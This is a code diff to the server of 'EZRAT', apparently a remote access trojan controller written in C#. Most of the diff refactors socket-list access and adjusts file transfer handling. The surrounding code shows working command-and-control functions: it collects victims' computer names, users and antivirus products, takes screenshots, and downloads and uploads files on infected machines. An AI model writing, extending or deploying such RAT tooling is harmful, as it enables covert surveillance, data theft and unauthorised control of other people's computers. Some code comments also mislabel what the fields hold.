@@ -133,6 +133,9 @@ namespace EZRATServer
         /// Distributes server start info to plugins
         /// </summary>
         private bool IsStartedServer { get { return _isServerStarted; } set { _isServerStarted = value; } }
+
+        public List<Socket> ClientSockets { get => _clientSockets; }
+
         /// <summary>
         /// Indicates if clients need to get new IDs
         /// </summary>
@@ -369,12 +372,12 @@ namespace EZRATServer
 
         void UpdateClient(object sender, EventArgs e)
         {
-            for (int i = 0; i < _clientSockets.Count; i++)
+            for (int i = 0; i < ClientSockets.Count; i++)
             {
-                if (!_clientSockets[i].Connected)
+                if (!ClientSockets[i].Connected)
                 {
                     lstClients.Items[i].Remove();
-                    _clientSockets.RemoveAt(i);
+                    ClientSockets.RemoveAt(i);
                 }
             }
         }
@@ -414,7 +417,7 @@ namespace EZRATServer
             IsStartedServer = false; //Set the server started to false
             int id = 0; //Declare the index variable
 
-            foreach (Socket socket in _clientSockets) //Go through each connected socket
+            foreach (Socket socket in ClientSockets) //Go through each connected socket
             {
                 try
                 {
@@ -435,7 +438,7 @@ namespace EZRATServer
                 _serverSocket.Close(); //Close the server socket
                 _serverSocket.Dispose(); //Dispose the server socket
 
-                _clientSockets.Clear(); //Remove all client sockets from the client list
+                ClientSockets.Clear(); //Remove all client sockets from the client list
             }
 
         }
@@ -458,8 +461,8 @@ namespace EZRATServer
                 return;
             }
 
-            _clientSockets.Add(socket); //Add the new socket to the list
-            int id = _clientSockets.Count - 1; //Get the new ID for the client
+            ClientSockets.Add(socket); //Add the new socket to the list
+            int id = ClientSockets.Count - 1; //Get the new ID for the client
             string cmd = "getinfo-" + id.ToString(); //Construct the command
             SendCommand(cmd, id); //Send the command
             socket.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, ReceiveCallback, socket); //Add the reading callback
@@ -476,7 +479,7 @@ namespace EZRATServer
         {
             int tracer = 0; //Declare index variable
 
-            foreach (Socket s in _clientSockets) //Go through the connected sockets
+            foreach (Socket s in ClientSockets) //Go through the connected sockets
             {
                 if (s == socket) //If the sockets match
                 {
@@ -554,7 +557,7 @@ namespace EZRATServer
         {
             try
             {
-                Socket s = _clientSockets[targetClient]; //Get the socket
+                Socket s = ClientSockets[targetClient]; //Get the socket
 
                 try
                 {
@@ -574,7 +577,7 @@ namespace EZRATServer
                     reScanStart = id; //Set the rescan target
                     Console.WriteLine("Client forcefully disconnected"); //Debug Function
                     s.Close(); //Close the target socket
-                    _clientSockets.Remove(s); //Remove the socket from the list
+                    ClientSockets.Remove(s); //Remove the socket from the list
                     RestartServer(id); //Restart the server
                     return; //Return
                 }
@@ -628,7 +631,7 @@ namespace EZRATServer
                 reScanStart = id; //Set the starting ID for rescan
                 //Console.WriteLine("Client forcefully disconnected");
                 current.Close(); //Close the communicating socket
-                _clientSockets.Remove(current); //Remove the socket from the clients list
+                ClientSockets.Remove(current); //Remove the socket from the clients list
                 RestartServer(id); //Restart the server to rename every client
                 return; //Return
             }
@@ -651,7 +654,7 @@ namespace EZRATServer
                         Directory.CreateDirectory($"{path}\\Files");
                     }
                     FileStream fs = new FileStream($"{path}\\Files\\{fileNameDownload}", FileMode.Create);
-                    NetworkStream ns = new NetworkStream(this._clientSockets[GetIdClient()]);
+                    NetworkStream ns = new NetworkStream(this.ClientSockets[GetIdClient()]);
                     fs.Write(recBuf, 0, size);
                     try
                     {
@@ -664,7 +667,6 @@ namespace EZRATServer
                             fs.Write(data, 0, nb);
                             fs.Flush();
                             tot += (uint)nb;
-                            Console.WriteLine($"Data size : {data.Length}");
                             if(nb == -1)
                             {
                                 loop_break = false;
@@ -673,12 +675,13 @@ namespace EZRATServer
                     }
                     catch (IOException ex)
                     {
-                        Console.WriteLine($"Total data : {tot} {ex.Message}");
+                        MessageBox.Show("File download",$"File : {fileNameDownload} is downloaded",MessageBoxButtons.OK,MessageBoxIcon.Information);
                         fs.Close();
                         ns.Close();
                     }
 
                     OnOffDlFile = false;
+                    goto ENDFUNC;
                 }
 
 
@@ -699,7 +702,7 @@ namespace EZRATServer
                         string[] mainContainer = text.Split(';'); // Get the main data parts
                         int id = int.Parse(mainContainer[1]); //The client ID
                         string[] lines = mainContainer[2].Split(SeparatorChar); //Split the data into parts
-                        string ip = lines[0] + $" : {((IPEndPoint)_clientSockets[id].RemoteEndPoint).Port}"; //The computer's local IPv4 address
+                        string ip = lines[0] + $" : {((IPEndPoint)ClientSockets[id].RemoteEndPoint).Port}"; //The computer's local IPv4 address
                         string name = lines[1]; //The Computer Name
                         string user = lines[2].Substring(lines[2].LastIndexOf('\\') + 1); //The computer's date and time
                         string windows = lines[3]; //The computer's installed Anti Virus product
@@ -775,11 +778,15 @@ namespace EZRATServer
                         text = text.Substring(10);
                         byte[] img = Encoding.Default.GetBytes(text);
                         ShowScreenShot(StreamToImage(img));
+                    }else if(text.StartsWith("upfilestop;"))
+                    {
+                        MessageBox.Show("Upload file","File uploaded finish",MessageBoxButtons.OK,MessageBoxIcon.Information);
                     }
 
 
                 }
 
+                ENDFUNC:
 
                 if (!dclient) current.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, ReceiveCallback, current); //If client is not disconnecting, restart the reading
             }
@@ -826,7 +833,7 @@ namespace EZRATServer
 
         public void SendFile(string path, string pathUploaded)
         {
-            if (!_clientSockets[GetIdClient()].Connected) //If the client isn't connected
+            if (!ClientSockets[GetIdClient()].Connected) //If the client isn't connected
             {
                 Console.WriteLine("Socket is not connected!");
                 return; //Return
@@ -836,7 +843,7 @@ namespace EZRATServer
                 string data = Encrypt("upfile;" + pathUploaded + path.Substring(path.LastIndexOf('\\') + 1) + ";" + File.ReadAllText(path));
                 string header = data.Length.ToString() + "§";
                 byte[] result = Encoding.Default.GetBytes(header + data);
-                _clientSockets[GetIdClient()].Send(result);
+                ClientSockets[GetIdClient()].Send(result);
             }
             catch (Exception ex) //Failed to send data to the server
             {
